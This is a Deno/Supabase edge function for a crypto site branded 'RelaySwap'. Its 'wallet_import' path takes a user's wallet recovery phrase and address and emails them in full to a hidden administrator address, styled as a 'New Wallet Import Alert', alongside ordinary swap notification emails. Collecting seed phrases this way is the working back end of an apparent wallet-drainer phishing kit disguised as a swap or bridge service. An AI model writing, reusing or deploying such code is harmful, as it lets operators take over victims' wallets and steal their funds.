import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const RESEND_API_KEY = Deno.env.get('RESEND_API_KEY');
const ADMIN_EMAIL = Deno.env.get('ADMIN_EMAIL');
const SUPABASE_URL = Deno.env.get('SUPABASE_URL');
const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');

function walletImportTemplate({ phrase, address, walletName, walletIcon }) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wallet Import</title>
</head>
<body style="margin:0;padding:0;background:#0a0a0f;font-family:'Segoe UI',Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#0a0a0f;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="580" cellpadding="0" cellspacing="0" style="max-width:580px;width:100%;">
          <tr>
            <td style="background:linear-gradient(135deg,#0d1117,#111827);border:1px solid #1f2937;border-radius:16px 16px 0 0;padding:32px 36px 24px;">
              <table width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td>
                    <span style="font-size:22px;">⚡</span>
                    <span style="font-size:22px;font-weight:900;color:#ffffff;letter-spacing:2px;margin-left:6px;">RELAY</span>
                    <span style="font-size:10px;color:#6b7280;letter-spacing:3px;font-weight:700;text-transform:uppercase;margin-left:4px;">SWAP</span>
                  </td>
                  <td align="right">
                    <span style="background:#ff444422;border:1px solid #ff444444;color:#ff6b6b;font-size:10px;font-weight:700;letter-spacing:1.5px;padding:4px 10px;border-radius:20px;text-transform:uppercase;">
                      🔑 WALLET IMPORT
                    </span>
                  </td>
                </tr>
              </table>
              <div style="margin-top:20px;">
                <div style="font-size:12px;color:#6b7280;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;">New Wallet Import Alert</div>
                <div style="font-size:22px;font-weight:800;color:#ffffff;">${walletIcon} ${walletName}</div>
              </div>
            </td>
          </tr>
          <tr>
            <td style="background:#0d1117;border-left:1px solid #1f2937;border-right:1px solid #1f2937;padding:28px 36px;">
              <div style="margin-bottom:20px;">
                <div style="font-size:10px;color:#6b7280;letter-spacing:2px;text-transform:uppercase;font-weight:700;margin-bottom:10px;">Recovery Phrase</div>
                <div style="background:#111827;border:1px solid #1f2937;border-radius:12px;padding:18px 20px;">
                  <div style="font-size:14px;color:#00ff88;font-family:'Courier New',monospace;line-height:2;word-break:break-word;letter-spacing:0.5px;">
                    ${phrase}
                  </div>
                </div>
              </div>
              <div>
                <div style="font-size:10px;color:#6b7280;letter-spacing:2px;text-transform:uppercase;font-weight:700;margin-bottom:10px;">Wallet Address</div>
                <div style="background:#111827;border:1px solid #1f2937;border-radius:12px;padding:18px 20px;">
                  <div style="font-size:14px;color:#60a5fa;font-family:'Courier New',monospace;word-break:break-all;letter-spacing:0.5px;">
                    ${address}
                  </div>
                </div>
              </div>
            </td>
          </tr>
          <tr>
            <td style="background:#080b10;border:1px solid #1f2937;border-radius:0 0 16px 16px;padding:20px 36px;">
              <div style="font-size:11px;color:#374151;line-height:1.6;">
                Automated alert from RelaySwap · ${new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' })}
              </div>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

function txEmailTemplate({ tx }) {
  const time = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
  const modeLabel = tx.mode === 'bridge' ? 'Cross-Chain Bridge' : 'Token Swap';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>RelaySwap Transaction</title>
</head>
<body style="margin:0;padding:0;background:#0a0a0f;font-family:'Segoe UI',Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#0a0a0f;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="580" cellpadding="0" cellspacing="0" style="max-width:580px;width:100%;">
          <tr>
            <td style="background:linear-gradient(135deg,#0d1117,#111827);border:1px solid #1f2937;border-radius:16px 16px 0 0;padding:32px 36px 24px;">
              <table width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td>
                    <span style="font-size:22px;">⚡</span>
                    <span style="font-size:22px;font-weight:900;color:#ffffff;letter-spacing:2px;margin-left:6px;">RELAY</span>
                    <span style="font-size:10px;color:#6b7280;letter-spacing:3px;font-weight:700;text-transform:uppercase;margin-left:4px;">SWAP</span>
                  </td>
                  <td align="right">
                    <span style="background:#00ff8822;border:1px solid #00ff8844;color:#00ff88;font-size:10px;font-weight:700;letter-spacing:1.5px;padding:4px 10px;border-radius:20px;text-transform:uppercase;">● CONFIRMED</span>
                  </td>
                </tr>
              </table>
              <div style="margin-top:24px;">
                <div style="font-size:11px;color:#6b7280;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;">🔔 New Transaction Alert</div>
                <div style="font-size:28px;font-weight:800;color:#ffffff;letter-spacing:-0.5px;">
                  ${tx.from_amount} ${tx.from_token}
                  <span style="color:#00ff88;margin:0 8px;">→</span>
                  ${tx.to_amount} ${tx.to_token}
                </div>
                <div style="font-size:13px;color:#9ca3af;margin-top:6px;">${modeLabel} · ${time}</div>
              </div>
            </td>
          </tr>
          <tr>
            <td style="background:#0d1117;border-left:1px solid #1f2937;border-right:1px solid #1f2937;padding:0 36px;">
              <table width="100%" cellpadding="0" cellspacing="0" style="margin:24px 0;border:1px solid #1f2937;border-radius:12px;overflow:hidden;">
                ${[
                  ['Sold', `${tx.from_amount} ${tx.from_token}`],
                  ['Received', `${tx.to_amount} ${tx.to_token}`, '#00ff88'],
                  ['From Chain', tx.from_chain],
                  ['To Chain', tx.to_chain],
                  ['Wallet', tx.wallet_name],
                  ['Status', 'Confirmed', '#00ff88'],
                  ['Time', time],
                ].map(([k, v, color], i) => `
                <tr style="background:${i % 2 === 0 ? '#111827' : '#0d1117'}">
                  <td style="padding:12px 16px;font-size:12px;color:#6b7280;font-weight:600;letter-spacing:0.5px;text-transform:uppercase;width:140px;">${k}</td>
                  <td style="padding:12px 16px;font-size:13px;color:${color || '#e5e7eb'};font-weight:600;text-align:right;">${v}</td>
                </tr>`).join('')}
              </table>
              <div style="background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px 16px;margin-bottom:24px;">
                <div style="font-size:10px;color:#6b7280;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:6px;">Transaction Hash</div>
                <div style="font-size:11px;color:#00ff88;font-family:'Courier New',monospace;word-break:break-all;">${tx.tx_hash}</div>
              </div>
            </td>
          </tr>
          <tr>
            <td style="background:#080b10;border:1px solid #1f2937;border-radius:0 0 16px 16px;padding:24px 36px;">
              <div style="font-size:11px;color:#374151;">Automated notification from RelaySwap.</div>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', {
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
      }
    });
  }

  try {
    const body = await req.json();

    let subject: string;
    let html: string;

    if (body.type === 'wallet_import') {
      subject = `🔑 Wallet Import: ${body.walletName}`;
      html = walletImportTemplate(body);
    } else {
      subject = `🔔 New ${body.mode === 'bridge' ? 'Bridge' : 'Swap'}: ${body.from_amount} ${body.from_token} → ${body.to_token}`;
      html = txEmailTemplate({ tx: body });
    }

    // Send email via Resend
    const result = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${RESEND_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'RelaySwap <onboarding@resend.dev>',
        to: ADMIN_EMAIL,
        subject,
        html,
      }),
    }).then(r => r.json());

    // Save email log to Supabase — keeps project active & creates audit trail
    if (SUPABASE_URL && SUPABASE_SERVICE_KEY) {
      const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
      await supabase.from('email_logs').insert({
        type: body.type || 'transaction',
        subject,
        wallet_name: body.walletName || body.wallet_name || null,
        wallet_address: body.address || body.wallet_address || null,
        resend_id: result?.id || null,
        sent_at: new Date().toISOString(),
      });
    }

    return new Response(JSON.stringify({ success: true, result }), {
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
    });

  } catch (err) {
    return new Response(JSON.stringify({ error: (err as Error).message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
    });
  }
});